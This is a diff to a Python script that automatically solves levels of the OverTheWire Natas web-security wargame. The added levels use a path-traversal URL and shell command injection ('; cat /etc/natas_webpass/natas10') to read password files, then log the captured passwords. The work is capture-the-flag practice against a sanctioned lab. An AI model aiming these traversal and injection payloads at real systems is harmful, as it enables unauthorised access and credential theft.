@@ -6,6 +6,9 @@ import requests
 import base64
 import os
 import urllib2
+import string
+import binascii
+from string import ascii_lowercase
 from bs4 import BeautifulSoup
 
 
@@ -13,7 +16,7 @@ def encodeCreds(username, password):
     stringToBeEncoded = username + ':' + password
     auth_64 = base64.b64encode(stringToBeEncoded)
     # Base64 encoding is doing something weird and adding 'Cg== on the end'
-    auth_64 = auth_64.replace('Cg==', '')
+    # auth_64 = auth_64.replace('Cg==', '')
     return(auth_64)
 
 def login(username, password, url, headers):
@@ -35,7 +38,7 @@ def eraseFile():
 def writeToFlagFile(flagToWrite, level):
     filename = 'flags.txt'
     file = open(filename, "a")
-    file.write('Level ' + level + ' - ' + flagToWrite + '\n')
+    file.write('Level ' + level + '\t- ' + flagToWrite + '\n')
     file.close()
     return()
 
@@ -49,6 +52,10 @@ def cleanFlagFile():
     file.close()
     return()
 
+def cleanFlag(password):
+    password = password.replace('\n', '')
+    return(password)
+
 def natas0():
     url = 'http://natas0.natas.labs.overthewire.org/'
     username = 'natas0'
@@ -60,7 +67,7 @@ def natas0():
     print('[+] Logging into Natas 0 [+]')
     response = login(username, password, url, headers)
     natas1Password = response[857:889]
-    print('Password for next level is: ' + natas1Password)
+    print('Password for the next level is: ' + natas1Password)
     return(natas1Password)
 
 def natas1(natas1Password):
@@ -73,7 +80,7 @@ def natas1(natas1Password):
     print('[+] Logging into Natas 1 [+]')
     response = login(username, natas1Password, url, headers)
     natas2Password = response[1002:1034]
-    print('Password for next level is: ' + natas2Password)
+    print('Password for the next level is: ' + natas2Password)
     return(natas2Password)
 
 def natas2(natas2Password):
@@ -94,7 +101,8 @@ def natas2(natas2Password):
                 userPassword = line.replace('natas3:', '')
                 file.close()
                 break
-    print('Password for next level is: ' + userPassword)
+    userPassword = cleanFlag(userPassword)
+    print('Password for the next level is: ' + userPassword)
     os.remove('natas2.tmp')
     return(userPassword)
 
@@ -116,7 +124,8 @@ def natas3(natas3Password):
                 userPassword = line.replace('natas4:', '')
                 break
     file.close()
-    print('Password for next level is: ' + userPassword)
+    userPassword = cleanFlag(userPassword)
+    print('Password for the next level is: ' + userPassword)
     os.remove('natas3.tmp')
     return(userPassword)
 
@@ -164,9 +173,80 @@ def natas6(natas6Password):
         'submit' : 'Submit'
     }
     accessGrantedResponse = post(username, natas6Password, posturl, headers, data)
-    print(accessGrantedResponse)
     natas7Password = accessGrantedResponse[836:868]
+    natas7Password = cleanFlag(natas7Password)
+    print('Password for the next level is: ' + natas7Password)
     return(natas7Password)
+
+def natas7(natas7Password):
+    url = 'http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../../../etc/natas_webpass/natas8'
+    username = 'natas7'
+    auth_64 = encodeCreds(username, natas7Password)
+    headers = {
+        'Authorization' : 'Basic ' + auth_64
+    }
+    print('[+] Logging into Natas 7 [+]')
+    response = login(username, natas7Password, url, headers)
+    natas8Password = response[883:916]
+    natas8Password = cleanFlag(natas8Password)
+    print('Password for the next level is: ' + natas8Password)
+    return(natas8Password)
+
+def natas8(natas8Password):
+    url = 'http://natas8.natas.labs.overthewire.org/index-source.html'
+    posturl = 'http://natas8.natas.labs.overthewire.org/'
+    username = 'natas8'
+    auth_64 = encodeCreds(username, natas8Password)
+    headers = {
+        'Authorization' : 'Basic ' + auth_64
+    }
+    print('[+] Logging into Natas 8 [+]')
+    response = login(username, natas8Password, url, headers)
+    encodedSecret = response[1229:1261]
+    encodedSecret = binascii.unhexlify(encodedSecret)
+    encodedSecret = encodedSecret[::-1]
+    encodedSecret = base64.b64decode(encodedSecret)
+    data= {
+        'secret' : encodedSecret,
+        'submit' : 'Submit'
+    }
+    postResponse = post(username, natas8Password, posturl, headers, data)
+    natas9Password = postResponse[836:868]
+    print('Password for the next level is: ' + natas9Password)
+    natas9Password = cleanFlag(natas9Password)
+    return(natas9Password)
+
+def natas9(natas9Password):
+    url = 'http://natas9.natas.labs.overthewire.org/?needle=%3B+cat+%2Fetc%2Fnatas_webpass%2Fnatas10&submit=Search'
+    username = 'natas9'
+    auth_64 = encodeCreds(username, natas9Password)
+    headers = {
+        'Authorization' : 'Basic ' + auth_64
+    }
+    print('[+] Logging into Natas 9 [+]')
+    response = login(username, natas9Password, url, headers)
+    natas10Password = response[918:950]
+    print('Password for the next level is: ' + natas10Password)
+    natas10Password = cleanFlag(natas10Password)
+    return(natas10Password)
+
+def natas10(natas10Password):
+    username = 'natas10'
+    auth_64 = encodeCreds(username, natas10Password)
+    headers = {
+        'Authorization' : 'Basic ' + auth_64
+    }
+    print('[+] Logging into Natas 10 [+]')
+    for c in ascii_lowercase:
+        url = "http://natas10.natas.labs.overthewire.org/?needle=" + str(c) + "+%2Fetc%2Fnatas_webpass%2Fnatas11+&submit=Search"
+        response = login(username, natas10Password, url, headers)
+        if '/etc/natas_webpass' in response[0:1100]:
+            natas11Password = response[1016:1048]
+            break
+    #natas11Password = response
+    print('Password for the next level is: ' + natas11Password)
+    natas11Password = cleanFlag(natas11Password)
+    return(natas11Password)
 
 def main():
     os.system('clear')
@@ -186,6 +266,14 @@ def main():
     writeToFlagFile(natas6Password, '6')
     natas7Password = natas6(natas6Password)
     writeToFlagFile(natas7Password, '7')
+    natas8Password = natas7(natas7Password)
+    writeToFlagFile(natas8Password, '8')
+    natas9Password = natas8(natas8Password)
+    writeToFlagFile(natas9Password, '9')
+    natas10Password = natas9(natas9Password)
+    writeToFlagFile(natas10Password, '10')
+    natas11Password = natas10(natas10Password)
+    writeToFlagFile(natas11Password, '11')
 
     cleanFlagFile()
 
